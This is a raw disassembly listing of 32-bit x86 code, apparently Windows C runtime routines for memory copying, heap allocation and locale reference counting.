  424916:	inc    edx
  424917:	add    BYTE PTR [ecx+ecx*2+0x42],al
  42491b:	add    BYTE PTR [ecx+ecx*2+0x42],cl
  42491f:	add    BYTE PTR [ecx+ecx*2+0x42],dl
  424923:	add    BYTE PTR [ecx+ecx*2+0x42],bl
  424927:	add    BYTE PTR [edi+0x49],ch
  42492a:	inc    edx
  42492b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424931:	inc    esp
  424932:	(bad)  
  424933:	sbb    al,0x8b
  424935:	inc    esp
  424936:	mov    ds,WORD PTR [eax]
  424938:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42493c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424940:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424944:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424948:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42494c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424950:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424954:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424958:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42495c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424960:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424964:	lea    eax,[ecx*4+0x0]
  42496b:	add    esi,eax
  42496d:	add    edi,eax
  42496f:	jmp    DWORD PTR [edx*4+0x424978]
  424976:	mov    edi,edi
  424978:	mov    BYTE PTR [ecx+0x42],cl
  42497b:	add    BYTE PTR [eax-0x5fffbdb7],dl
  424981:	dec    ecx
  424982:	inc    edx
  424983:	add    BYTE PTR [ecx+ecx*2+0x458b0042],dh
  42498a:	or     BYTE PTR [esi+0x5f],bl
  42498d:	leave  
  42498e:	ret    
  42498f:	nop
  424990:	mov    al,BYTE PTR [esi+0x3]
  424993:	mov    BYTE PTR [edi+0x3],al
  424996:	mov    eax,DWORD PTR [ebp+0x8]
  424999:	pop    esi
  42499a:	pop    edi
  42499b:	leave  
  42499c:	ret    
  42499d:	lea    ecx,[ecx+0x0]
  4249a0:	mov    al,BYTE PTR [esi+0x3]
  4249a3:	mov    BYTE PTR [edi+0x3],al
  4249a6:	mov    al,BYTE PTR [esi+0x2]
  4249a9:	mov    BYTE PTR [edi+0x2],al
  4249ac:	mov    eax,DWORD PTR [ebp+0x8]
  4249af:	pop    esi
  4249b0:	pop    edi
  4249b1:	leave  
  4249b2:	ret    
  4249b3:	nop
  4249b4:	mov    al,BYTE PTR [esi+0x3]
  4249b7:	mov    BYTE PTR [edi+0x3],al
  4249ba:	mov    al,BYTE PTR [esi+0x2]
  4249bd:	mov    BYTE PTR [edi+0x2],al
  4249c0:	mov    al,BYTE PTR [esi+0x1]
  4249c3:	mov    BYTE PTR [edi+0x1],al
  4249c6:	mov    eax,DWORD PTR [ebp+0x8]
  4249c9:	pop    esi
  4249ca:	pop    edi
  4249cb:	leave  
  4249cc:	ret    
  4249cd:	push   DWORD PTR [esp+0x4]
  4249d1:	call   DWORD PTR ds:0x4280e8
  4249d7:	xor    eax,eax
  4249d9:	inc    eax
  4249da:	ret    0x8
  4249dd:	push   0x10
  4249df:	push   0x428610
  4249e4:	call   0x423950
  4249e9:	mov    eax,ds:0x465028
  4249ee:	test   eax,eax
  4249f0:	jne    0x424a29
  4249f2:	cmp    DWORD PTR ds:0x464d64,0x1
  4249f9:	je     0x424a1f
  4249fb:	push   0x4285fc
  424a00:	call   DWORD PTR ds:0x428044
  424a06:	test   eax,eax
  424a08:	je     0x424a1f
  424a0a:	push   0x4285d4
  424a0f:	push   eax
  424a10:	call   DWORD PTR ds:0x42804c
  424a16:	mov    ds:0x465028,eax
  424a1b:	test   eax,eax
  424a1d:	jne    0x424a29
  424a1f:	mov    eax,0x4249cd
  424a24:	mov    ds:0x465028,eax
  424a29:	and    DWORD PTR [ebp-0x4],0x0
  424a2d:	push   DWORD PTR [ebp+0xc]
  424a30:	push   DWORD PTR [ebp+0x8]
  424a33:	call   eax
  424a35:	mov    DWORD PTR [ebp-0x1c],eax
  424a38:	jmp    0x424a5e
  424a3a:	mov    eax,DWORD PTR [ebp-0x14]
  424a3d:	mov    eax,DWORD PTR [eax]
  424a3f:	mov    eax,DWORD PTR [eax]
  424a41:	mov    DWORD PTR [ebp-0x20],eax
  424a44:	xor    eax,eax
  424a46:	inc    eax
  424a47:	ret    
  424a48:	mov    esp,DWORD PTR [ebp-0x18]
  424a4b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424a52:	jne    0x424a5c
  424a54:	push   0x8
  424a56:	call   DWORD PTR ds:0x4280a8
  424a5c:	xor    eax,eax
  424a5e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a62:	call   0x42398b
  424a67:	ret    
  424a68:	push   0x10
  424a6a:	push   0x428620
  424a6f:	call   0x423950
  424a74:	mov    esi,DWORD PTR [ebp+0x8]
  424a77:	imul   esi,DWORD PTR [ebp+0xc]
  424a7b:	mov    DWORD PTR [ebp-0x1c],esi
  424a7e:	test   esi,esi
  424a80:	jne    0x424a83
  424a82:	inc    esi
  424a83:	xor    edi,edi
  424a85:	mov    DWORD PTR [ebp-0x20],edi
  424a88:	cmp    esi,0xffffffe0
  424a8b:	ja     0x424af2
  424a8d:	cmp    DWORD PTR ds:0x4653e4,0x3
  424a94:	jne    0x424add
  424a96:	add    esi,0xf
  424a99:	and    esi,0xfffffff0
  424a9c:	mov    DWORD PTR [ebp+0xc],esi
  424a9f:	mov    ebx,DWORD PTR [ebp-0x1c]
  424aa2:	cmp    ebx,DWORD PTR ds:0x4651a4
  424aa8:	ja     0x424add
  424aaa:	push   0x4
  424aac:	call   0x423b0f
  424ab1:	pop    ecx
  424ab2:	and    DWORD PTR [ebp-0x4],edi
  424ab5:	push   ebx
  424ab6:	call   0x425511
  424abb:	pop    ecx
  424abc:	mov    DWORD PTR [ebp-0x20],eax
  424abf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424ac3:	call   0x424b12
  424ac8:	mov    edi,DWORD PTR [ebp-0x20]
  424acb:	test   edi,edi
  424acd:	je     0x424ae1
  424acf:	push   DWORD PTR [ebp-0x1c]
  424ad2:	push   0x0
  424ad4:	push   edi
  424ad5:	call   0x426250
  424ada:	add    esp,0xc
  424add:	test   edi,edi
  424adf:	jne    0x424b1b
  424ae1:	push   esi
  424ae2:	push   0x8
  424ae4:	push   DWORD PTR ds:0x4653e0
  424aea:	call   DWORD PTR ds:0x4280e4
  424af0:	mov    edi,eax
  424af2:	test   edi,edi
  424af4:	jne    0x424b1b
  424af6:	cmp    DWORD PTR ds:0x465068,edi
  424afc:	je     0x424b1b
  424afe:	push   esi
  424aff:	call   0x426232
  424b04:	pop    ecx
  424b05:	test   eax,eax
  424b07:	jne    0x424a83
  424b0d:	jmp    0x424b1d
  424b0f:	mov    esi,DWORD PTR [ebp+0xc]
  424b12:	push   0x4
  424b14:	call   0x423a7b
  424b19:	pop    ecx
  424b1a:	ret    
  424b1b:	mov    eax,edi
  424b1d:	call   0x42398b
  424b22:	ret    
  424b23:	push   esi
  424b24:	mov    esi,DWORD PTR [esp+0x8]
  424b28:	mov    eax,DWORD PTR [esi+0x3c]
  424b2b:	push   edi
  424b2c:	xor    edi,edi
  424b2e:	cmp    eax,DWORD PTR ds:0x465074
  424b34:	je     0x424b99
  424b36:	cmp    eax,edi
  424b38:	je     0x424b99
  424b3a:	mov    eax,DWORD PTR [esi+0x2c]
  424b3d:	cmp    DWORD PTR [eax],edi
  424b3f:	jne    0x424b99
  424b41:	mov    eax,DWORD PTR [esi+0x34]
  424b44:	cmp    eax,edi
  424b46:	je     0x424b64
  424b48:	cmp    DWORD PTR [eax],edi
  424b4a:	jne    0x424b64
  424b4c:	cmp    eax,DWORD PTR ds:0x465190
  424b52:	je     0x424b64
  424b54:	push   eax
  424b55:	call   0x42455a
  424b5a:	push   DWORD PTR [esi+0x3c]
  424b5d:	call   0x42649f
  424b62:	pop    ecx
  424b63:	pop    ecx
  424b64:	mov    eax,DWORD PTR [esi+0x30]
  424b67:	cmp    eax,edi
  424b69:	je     0x424b87
  424b6b:	cmp    DWORD PTR [eax],edi
  424b6d:	jne    0x424b87
  424b6f:	cmp    eax,DWORD PTR ds:0x465194
  424b75:	je     0x424b87
  424b77:	push   eax
  424b78:	call   0x42455a
  424b7d:	push   DWORD PTR [esi+0x3c]
  424b80:	call   0x426440
  424b85:	pop    ecx
  424b86:	pop    ecx
  424b87:	push   DWORD PTR [esi+0x2c]
  424b8a:	call   0x42455a
  424b8f:	push   DWORD PTR [esi+0x3c]
  424b92:	call   0x42455a
  424b97:	pop    ecx
  424b98:	pop    ecx
  424b99:	mov    eax,DWORD PTR [esi+0x40]
  424b9c:	cmp    eax,DWORD PTR ds:0x46518c
  424ba2:	je     0x424bbc
  424ba4:	cmp    eax,edi
  424ba6:	je     0x424bbc
  424ba8:	cmp    DWORD PTR [eax],edi
  424baa:	jne    0x424bbc
  424bac:	push   eax
  424bad:	call   0x42455a
  424bb2:	push   DWORD PTR [esi+0x44]
  424bb5:	call   0x42455a
  424bba:	pop    ecx
  424bbb:	pop    ecx
  424bbc:	mov    eax,DWORD PTR [esi+0x50]
  424bbf:	cmp    eax,DWORD PTR ds:0x465070
  424bc5:	je     0x424be3
  424bc7:	cmp    eax,edi
  424bc9:	je     0x424be3
  424bcb:	cmp    DWORD PTR [eax+0xb4],edi
  424bd1:	jne    0x424be3
  424bd3:	push   eax
  424bd4:	call   0x4262b0
  424bd9:	push   DWORD PTR [esi+0x50]
  424bdc:	call   0x42455a
  424be1:	pop    ecx
  424be2:	pop    ecx
  424be3:	push   esi
  424be4:	call   0x42455a
  424be9:	pop    ecx
  424bea:	pop    edi
  424beb:	pop    esi
  424bec:	ret    
  424bed:	push   esi
  424bee:	call   0x423803
  424bf3:	mov    esi,eax
  424bf5:	mov    eax,DWORD PTR [esi+0x64]
  424bf8:	cmp    eax,DWORD PTR ds:0x46481c
  424bfe:	je     0x424caa
  424c04:	test   eax,eax
  424c06:	je     0x424c37
  424c08:	mov    ecx,DWORD PTR [eax+0x2c]
  424c0b:	dec    DWORD PTR [eax]
  424c0d:	test   ecx,ecx
  424c0f:	je     0x424c13
  424c11:	dec    DWORD PTR [ecx]
  424c13:	mov    ecx,DWORD PTR [eax+0x34]
  424c16:	test   ecx,ecx
  424c18:	je     0x424c1c
  424c1a:	dec    DWORD PTR [ecx]
  424c1c:	mov    ecx,DWORD PTR [eax+0x30]
  424c1f:	test   ecx,ecx
  424c21:	je     0x424c25
  424c23:	dec    DWORD PTR [ecx]
  424c25:	mov    ecx,DWORD PTR [eax+0x40]
  424c28:	test   ecx,ecx
  424c2a:	je     0x424c2e
  424c2c:	dec    DWORD PTR [ecx]
  424c2e:	mov    ecx,DWORD PTR [eax+0x4c]
  424c31:	dec    DWORD PTR [ecx+0xb4]
  424c37:	mov    ecx,DWORD PTR ds:0x46481c
  424c3d:	mov    DWORD PTR [esi+0x64],ecx
  424c40:	mov    ecx,DWORD PTR ds:0x46481c
  424c46:	inc    DWORD PTR [ecx]
  424c48:	mov    ecx,DWORD PTR ds:0x46481c
  424c4e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424c51:	test   ecx,ecx
  424c53:	je     0x424c57
  424c55:	inc    DWORD PTR [ecx]
  424c57:	mov    ecx,DWORD PTR ds:0x46481c
  424c5d:	mov    ecx,DWORD PTR [ecx+0x34]
  424c60:	test   ecx,ecx
  424c62:	je     0x424c66
  424c64:	inc    DWORD PTR [ecx]
  424c66:	mov    ecx,DWORD PTR ds:0x46481c
  424c6c:	mov    ecx,DWORD PTR [ecx+0x30]
  424c6f:	test   ecx,ecx
  424c71:	je     0x424c75
  424c73:	inc    DWORD PTR [ecx]
  424c75:	mov    ecx,DWORD PTR ds:0x46481c
  424c7b:	mov    ecx,DWORD PTR [ecx+0x40]
  424c7e:	test   ecx,ecx
  424c80:	je     0x424c84
  424c82:	inc    DWORD PTR [ecx]
  424c84:	mov    ecx,DWORD PTR ds:0x46481c
  424c8a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424c8d:	inc    DWORD PTR [ecx+0xb4]
  424c93:	test   eax,eax
  424c95:	je     0x424caa
  424c97:	cmp    DWORD PTR [eax],0x0
  424c9a:	jne    0x424caa
  424c9c:	cmp    eax,0x4647c8
  424ca1:	je     0x424caa
  424ca3:	push   eax
  424ca4:	call   0x424b23
  424ca9:	pop    ecx
  424caa:	mov    eax,DWORD PTR [esi+0x64]
  424cad:	pop    esi
  424cae:	ret    
  424caf:	push   0xc
  424cb1:	push   0x4287b0
  424cb6:	call   0x423950
  424cbb:	push   0xc
  424cbd:	call   0x423b0f
  424cc2:	pop    ecx
  424cc3:	and    DWORD PTR [ebp-0x4],0x0
  424cc7:	call   0x424bed
  424ccc:	mov    DWORD PTR [ebp-0x1c],eax
  424ccf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424cd3:	call   0x424ce1
  424cd8:	mov    eax,DWORD PTR [ebp-0x1c]
  424cdb:	call   0x42398b
  424ce0:	ret    
  424ce1:	push   0xc
  424ce3:	call   0x423a7b
  424ce8:	pop    ecx
  424ce9:	ret    
  424cea:	push   0x140
  424cef:	push   0x0
  424cf1:	push   DWORD PTR ds:0x4653e0
  424cf7:	call   DWORD PTR ds:0x4280e4
  424cfd:	test   eax,eax
  424cff:	mov    ds:0x4651a0,eax
  424d04:	jne    0x424d07
  424d06:	ret    
  424d07:	mov    ecx,DWORD PTR [esp+0x4]
  424d0b:	and    DWORD PTR ds:0x465198,0x0
  424d12:	and    DWORD PTR ds:0x46519c,0x0
  424d19:	mov    ds:0x4651a8,eax
  424d1e:	xor    eax,eax
  424d20:	mov    DWORD PTR ds:0x4651a4,ecx
  424d26:	mov    DWORD PTR ds:0x4651ac,0x10
  424d30:	inc    eax
  424d31:	ret    
  424d32:	mov    eax,ds:0x46519c
  424d37:	lea    ecx,[eax+eax*4]
  424d3a:	mov    eax,ds:0x4651a0
  424d3f:	lea    ecx,[eax+ecx*4]
  424d42:	jmp    0x424d56
  424d44:	mov    edx,DWORD PTR [esp+0x4]
  424d48:	sub    edx,DWORD PTR [eax+0xc]
  424d4b:	cmp    edx,0x100000
  424d51:	jb     0x424d5c
  424d53:	add    eax,0x14
  424d56:	cmp    eax,ecx
  424d58:	jb     0x424d44
  424d5a:	xor    eax,eax
  424d5c:	ret    
  424d5d:	push   ebp
  424d5e:	mov    ebp,esp
  424d60:	sub    esp,0x10
  424d63:	mov    ecx,DWORD PTR [ebp+0x8]
  424d66:	mov    eax,DWORD PTR [ecx+0x10]
  424d69:	push   esi
  424d6a:	mov    esi,DWORD PTR [ebp+0xc]
  424d6d:	push   edi
  424d6e:	mov    edi,esi
  424d70:	sub    edi,DWORD PTR [ecx+0xc]
  424d73:	add    esi,0xfffffffc
  424d76:	shr    edi,0xf
  424d79:	mov    ecx,edi
  424d7b:	imul   ecx,ecx,0x204
  424d81:	lea    ecx,[ecx+eax*1+0x144]
  424d88:	mov    DWORD PTR [ebp-0x10],ecx
  424d8b:	mov    ecx,DWORD PTR [esi]
  424d8d:	dec    ecx
  424d8e:	test   cl,0x1
  424d91:	mov    DWORD PTR [ebp-0x4],ecx
  424d94:	jne    0x425071
  424d9a:	push   ebx
  424d9b:	lea    ebx,[ecx+esi*1]
  424d9e:	mov    edx,DWORD PTR [ebx]
  424da0:	mov    DWORD PTR [ebp-0xc],edx
  424da3:	mov    edx,DWORD PTR [esi-0x4]
  424da6:	mov    DWORD PTR [ebp-0x8],edx
  424da9:	mov    edx,DWORD PTR [ebp-0xc]
  424dac:	test   dl,0x1
  424daf:	mov    DWORD PTR [ebp+0xc],ebx
  424db2:	jne    0x424e28
  424db4:	sar    edx,0x4
  424db7:	dec    edx
  424db8:	cmp    edx,0x3f
  424dbb:	jbe    0x424dc0
  424dbd:	push   0x3f
  424dbf:	pop    edx
  424dc0:	mov    ecx,DWORD PTR [ebx+0x4]
  424dc3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424dc6:	jne    0x424e0a
  424dc8:	cmp    edx,0x20
  424dcb:	mov    ebx,0x80000000
  424dd0:	jae    0x424deb
  424dd2:	mov    ecx,edx
  424dd4:	shr    ebx,cl
  424dd6:	lea    ecx,[edx+eax*1+0x4]
  424dda:	not    ebx
  424ddc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424de0:	dec    BYTE PTR [ecx]
  424de2:	jne    0x424e07
  424de4:	mov    ecx,DWORD PTR [ebp+0x8]
  424de7:	and    DWORD PTR [ecx],ebx
  424de9:	jmp    0x424e07
  424deb:	lea    ecx,[edx-0x20]
  424dee:	shr    ebx,cl
  424df0:	lea    ecx,[edx+eax*1+0x4]
  424df4:	not    ebx
  424df6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424dfd:	dec    BYTE PTR [ecx]
  424dff:	jne    0x424e07
  424e01:	mov    ecx,DWORD PTR [ebp+0x8]
  424e04:	and    DWORD PTR [ecx+0x4],ebx
  424e07:	mov    ebx,DWORD PTR [ebp+0xc]
  424e0a:	mov    edx,DWORD PTR [ebx+0x8]
  424e0d:	mov    ebx,DWORD PTR [ebx+0x4]
  424e10:	mov    ecx,DWORD PTR [ebp-0x4]
  424e13:	add    ecx,DWORD PTR [ebp-0xc]
  424e16:	mov    DWORD PTR [edx+0x4],ebx
  424e19:	mov    edx,DWORD PTR [ebp+0xc]
  424e1c:	mov    ebx,DWORD PTR [edx+0x4]
  424e1f:	mov    edx,DWORD PTR [edx+0x8]
  424e22:	mov    DWORD PTR [ebx+0x8],edx
  424e25:	mov    DWORD PTR [ebp-0x4],ecx
  424e28:	mov    edx,ecx
  424e2a:	sar    edx,0x4
  424e2d:	dec    edx
  424e2e:	cmp    edx,0x3f
  424e31:	jbe    0x424e36
  424e33:	push   0x3f
  424e35:	pop    edx
  424e36:	mov    ebx,DWORD PTR [ebp-0x8]
  424e39:	and    ebx,0x1
  424e3c:	mov    DWORD PTR [ebp-0xc],ebx
  424e3f:	jne    0x424ed4
  424e45:	sub    esi,DWORD PTR [ebp-0x8]
  424e48:	mov    ebx,DWORD PTR [ebp-0x8]
  424e4b:	sar    ebx,0x4
  424e4e:	push   0x3f
  424e50:	mov    DWORD PTR [ebp+0xc],esi
  424e53:	dec    ebx
  424e54:	pop    esi
  424e55:	cmp    ebx,esi
  424e57:	jbe    0x424e5b
  424e59:	mov    ebx,esi
  424e5b:	add    ecx,DWORD PTR [ebp-0x8]
  424e5e:	mov    edx,ecx
  424e60:	sar    edx,0x4
  424e63:	dec    edx
  424e64:	cmp    edx,esi
  424e66:	mov    DWORD PTR [ebp-0x4],ecx
  424e69:	jbe    0x424e6d
  424e6b:	mov    edx,esi
  424e6d:	cmp    ebx,edx
  424e6f:	je     0x424ecf
  424e71:	mov    ecx,DWORD PTR [ebp+0xc]
  424e74:	mov    esi,DWORD PTR [ecx+0x4]
  424e77:	cmp    esi,DWORD PTR [ecx+0x8]
  424e7a:	jne    0x424eb7
  424e7c:	cmp    ebx,0x20
  424e7f:	mov    esi,0x80000000
  424e84:	jae    0x424e9d
  424e86:	mov    ecx,ebx
  424e88:	shr    esi,cl
  424e8a:	not    esi
  424e8c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424e90:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e94:	jne    0x424eb7
  424e96:	mov    ecx,DWORD PTR [ebp+0x8]
  424e99:	and    DWORD PTR [ecx],esi
  424e9b:	jmp    0x424eb7
  424e9d:	lea    ecx,[ebx-0x20]
  424ea0:	shr    esi,cl
  424ea2:	not    esi
  424ea4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424eab:	dec    BYTE PTR [ebx+eax*1+0x4]
  424eaf:	jne    0x424eb7
  424eb1:	mov    ecx,DWORD PTR [ebp+0x8]
  424eb4:	and    DWORD PTR [ecx+0x4],esi
  424eb7:	mov    ecx,DWORD PTR [ebp+0xc]
  424eba:	mov    esi,DWORD PTR [ecx+0x8]
  424ebd:	mov    ecx,DWORD PTR [ecx+0x4]
  424ec0:	mov    DWORD PTR [esi+0x4],ecx
  424ec3:	mov    ecx,DWORD PTR [ebp+0xc]
  424ec6:	mov    esi,DWORD PTR [ecx+0x4]
  424ec9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ecc:	mov    DWORD PTR [esi+0x8],ecx
  424ecf:	mov    esi,DWORD PTR [ebp+0xc]
  424ed2:	jmp    0x424ed7
  424ed4:	mov    ebx,DWORD PTR [ebp+0x8]
  424ed7:	cmp    DWORD PTR [ebp-0xc],0x0
  424edb:	jne    0x424ee5
  424edd:	cmp    ebx,edx
  424edf:	je     0x424f65
  424ee5:	mov    ecx,DWORD PTR [ebp-0x10]
  424ee8:	lea    ecx,[ecx+edx*8]
  424eeb:	mov    ebx,DWORD PTR [ecx+0x4]
  424eee:	mov    DWORD PTR [esi+0x8],ecx
  424ef1:	mov    DWORD PTR [esi+0x4],ebx
  424ef4:	mov    DWORD PTR [ecx+0x4],esi
  424ef7:	mov    ecx,DWORD PTR [esi+0x4]
  424efa:	mov    DWORD PTR [ecx+0x8],esi
  424efd:	mov    ecx,DWORD PTR [esi+0x4]
  424f00:	cmp    ecx,DWORD PTR [esi+0x8]
  424f03:	jne    0x424f65
  424f05:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424f09:	mov    BYTE PTR [ebp+0xf],cl
  424f0c:	inc    cl
  424f0e:	cmp    edx,0x20
  424f11:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424f15:	jae    0x424f3c
  424f17:	cmp    BYTE PTR [ebp+0xf],0x0
  424f1b:	jne    0x424f2b
  424f1d:	mov    ecx,edx
  424f1f:	mov    ebx,0x80000000
  424f24:	shr    ebx,cl
  424f26:	mov    ecx,DWORD PTR [ebp+0x8]
  424f29:	or     DWORD PTR [ecx],ebx
  424f2b:	mov    ebx,0x80000000
  424f30:	mov    ecx,edx
  424f32:	shr    ebx,cl
  424f34:	lea    eax,[eax+edi*4+0x44]
  424f38:	or     DWORD PTR [eax],ebx
  424f3a:	jmp    0x424f65
  424f3c:	cmp    BYTE PTR [ebp+0xf],0x0
  424f40:	jne    0x424f52
  424f42:	lea    ecx,[edx-0x20]
  424f45:	mov    ebx,0x80000000
  424f4a:	shr    ebx,cl
  424f4c:	mov    ecx,DWORD PTR [ebp+0x8]
  424f4f:	or     DWORD PTR [ecx+0x4],ebx
  424f52:	lea    ecx,[edx-0x20]
  424f55:	mov    edx,0x80000000
  424f5a:	shr    edx,cl
  424f5c:	lea    eax,[eax+edi*4+0xc4]
  424f63:	or     DWORD PTR [eax],edx
  424f65:	mov    eax,DWORD PTR [ebp-0x4]
  424f68:	mov    DWORD PTR [esi],eax
  424f6a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424f6e:	mov    eax,DWORD PTR [ebp-0x10]
  424f71:	dec    DWORD PTR [eax]
  424f73:	jne    0x425070
  424f79:	mov    eax,ds:0x465198
  424f7e:	test   eax,eax
  424f80:	je     0x425062
  424f86:	mov    ecx,DWORD PTR ds:0x4651b0
  424f8c:	mov    esi,DWORD PTR ds:0x4280c4
  424f92:	push   0x4000
  424f97:	shl    ecx,0xf
  424f9a:	add    ecx,DWORD PTR [eax+0xc]
  424f9d:	mov    ebx,0x8000
  424fa2:	push   ebx
  424fa3:	push   ecx
  424fa4:	call   esi
  424fa6:	mov    ecx,DWORD PTR ds:0x4651b0
  424fac:	mov    eax,ds:0x465198
  424fb1:	mov    edx,0x80000000
  424fb6:	shr    edx,cl
  424fb8:	or     DWORD PTR [eax+0x8],edx
  424fbb:	mov    eax,ds:0x465198
  424fc0:	mov    eax,DWORD PTR [eax+0x10]
  424fc3:	mov    ecx,DWORD PTR ds:0x4651b0
  424fc9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424fd1:	mov    eax,ds:0x465198
  424fd6:	mov    eax,DWORD PTR [eax+0x10]
  424fd9:	dec    BYTE PTR [eax+0x43]
  424fdc:	mov    eax,ds:0x465198
  424fe1:	mov    ecx,DWORD PTR [eax+0x10]
  424fe4:	cmp    BYTE PTR [ecx+0x43],0x0
  424fe8:	jne    0x424ff3
  424fea:	and    DWORD PTR [eax+0x4],0xfffffffe
  424fee:	mov    eax,ds:0x465198
  424ff3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424ff7:	jne    0x425062
  424ff9:	push   ebx
  424ffa:	push   0x0
  424ffc:	push   DWORD PTR [eax+0xc]
  424fff:	call   esi
  425001:	mov    eax,ds:0x465198
  425006:	push   DWORD PTR [eax+0x10]
  425009:	push   0x0
  42500b:	push   DWORD PTR ds:0x4653e0
  425011:	call   DWORD PTR ds:0x4280c8
  425017:	mov    eax,ds:0x46519c
  42501c:	mov    edx,DWORD PTR ds:0x4651a0
  425022:	lea    eax,[eax+eax*4]
  425025:	shl    eax,0x2
  425028:	mov    ecx,eax
  42502a:	mov    eax,ds:0x465198
  42502f:	sub    ecx,eax
  425031:	lea    ecx,[ecx+edx*1-0x14]
  425035:	push   ecx
  425036:	lea    ecx,[eax+0x14]
  425039:	push   ecx
  42503a:	push   eax
  42503b:	call   0x426890
  425040:	mov    eax,DWORD PTR [ebp+0x8]
  425043:	add    esp,0xc
  425046:	dec    DWORD PTR ds:0x46519c
  42504c:	cmp    eax,DWORD PTR ds:0x465198
  425052:	jbe    0x425058
  425054:	sub    DWORD PTR [ebp+0x8],0x14
  425058:	mov    eax,ds:0x4651a0
  42505d:	mov    ds:0x4651a8,eax
  425062:	mov    eax,DWORD PTR [ebp+0x8]
  425065:	mov    ds:0x465198,eax
  42506a:	mov    DWORD PTR ds:0x4651b0,edi
  425070:	pop    ebx
  425071:	pop    edi
  425072:	pop    esi
  425073:	leave  
  425074:	ret    
  425075:	mov    eax,ds:0x46519c
  42507a:	mov    ecx,DWORD PTR ds:0x4651ac
  425080:	push   edi
  425081:	xor    edi,edi
  425083:	cmp    eax,ecx
  425085:	jne    0x4250bb
  425087:	lea    eax,[ecx+ecx*4+0x50]
  42508b:	shl    eax,0x2
  42508e:	push   eax
  42508f:	push   DWORD PTR ds:0x4651a0
  425095:	push   edi
  425096:	push   DWORD PTR ds:0x4653e0
  42509c:	call   DWORD PTR ds:0x4280f0
  4250a2:	cmp    eax,edi
  4250a4:	jne    0x4250aa
  4250a6:	xor    eax,eax
  4250a8:	pop    edi
  4250a9:	ret    
  4250aa:	add    DWORD PTR ds:0x4651ac,0x10
  4250b1:	mov    ds:0x4651a0,eax
  4250b6:	mov    eax,ds:0x46519c
  4250bb:	mov    ecx,DWORD PTR ds:0x4651a0
  4250c1:	push   esi
  4250c2:	push   0x41c4
  4250c7:	push   0x8
  4250c9:	push   DWORD PTR ds:0x4653e0
  4250cf:	lea    eax,[eax+eax*4]
  4250d2:	lea    esi,[ecx+eax*4]
  4250d5:	call   DWORD PTR ds:0x4280e4
  4250db:	cmp    eax,edi
  4250dd:	mov    DWORD PTR [esi+0x10],eax
  4250e0:	jne    0x4250e6
  4250e2:	xor    eax,eax
  4250e4:	jmp    0x425129
  4250e6:	push   0x4
  4250e8:	push   0x2000
  4250ed:	push   0x100000
  4250f2:	push   edi
  4250f3:	call   DWORD PTR ds:0x4280ec
  4250f9:	cmp    eax,edi
  4250fb:	mov    DWORD PTR [esi+0xc],eax
  4250fe:	jne    0x425112
  425100:	push   DWORD PTR [esi+0x10]
  425103:	push   edi
  425104:	push   DWORD PTR ds:0x4653e0
  42510a:	call   DWORD PTR ds:0x4280c8
  425110:	jmp    0x4250e2
  425112:	or     DWORD PTR [esi+0x8],0xffffffff
  425116:	mov    DWORD PTR [esi],edi
  425118:	mov    DWORD PTR [esi+0x4],edi
  42511b:	inc    DWORD PTR ds:0x46519c
  425121:	mov    eax,DWORD PTR [esi+0x10]
  425124:	or     DWORD PTR [eax],0xffffffff
  425127:	mov    eax,esi
  425129:	pop    esi
  42512a:	pop    edi
  42512b:	ret    
  42512c:	push   ebp
  42512d:	mov    ebp,esp
  42512f:	push   ecx
  425130:	push   ecx
  425131:	mov    ecx,DWORD PTR [ebp+0x8]
  425134:	mov    eax,DWORD PTR [ecx+0x8]
  425137:	push   ebx
  425138:	push   esi
  425139:	mov    esi,DWORD PTR [ecx+0x10]
  42513c:	push   edi
  42513d:	xor    ebx,ebx
  42513f:	jmp    0x425144
  425141:	shl    eax,1
  425143:	inc    ebx
  425144:	test   eax,eax
  425146:	jge    0x425141
  425148:	mov    eax,ebx
  42514a:	imul   eax,eax,0x204
  425150:	lea    eax,[eax+esi*1+0x144]
  425157:	push   0x3f
  425159:	mov    DWORD PTR [ebp-0x8],eax
  42515c:	pop    edx
  42515d:	mov    DWORD PTR [eax+0x8],eax
  425160:	mov    DWORD PTR [eax+0x4],eax
  425163:	add    eax,0x8
  425166:	dec    edx
  425167:	jne    0x42515d
  425169:	push   0x4
  42516b:	mov    edi,ebx
  42516d:	push   0x1000
  425172:	shl    edi,0xf
  425175:	add    edi,DWORD PTR [ecx+0xc]
  425178:	push   0x8000
  42517d:	push   edi
  42517e:	call   DWORD PTR ds:0x4280ec
  425184:	test   eax,eax
  425186:	jne    0x425190
  425188:	or     eax,0xffffffff
  42518b:	jmp    0x42522d
  425190:	lea    edx,[edi+0x7000]
  425196:	cmp    edi,edx
  425198:	mov    DWORD PTR [ebp-0x4],edx
  42519b:	ja     0x4251e0
  42519d:	mov    ecx,edx
  42519f:	sub    ecx,edi
  4251a1:	shr    ecx,0xc
  4251a4:	lea    eax,[edi+0x10]
  4251a7:	inc    ecx
  4251a8:	or     DWORD PTR [eax-0x8],0xffffffff
  4251ac:	or     DWORD PTR [eax+0xfec],0xffffffff
  4251b3:	lea    edx,[eax+0xffc]
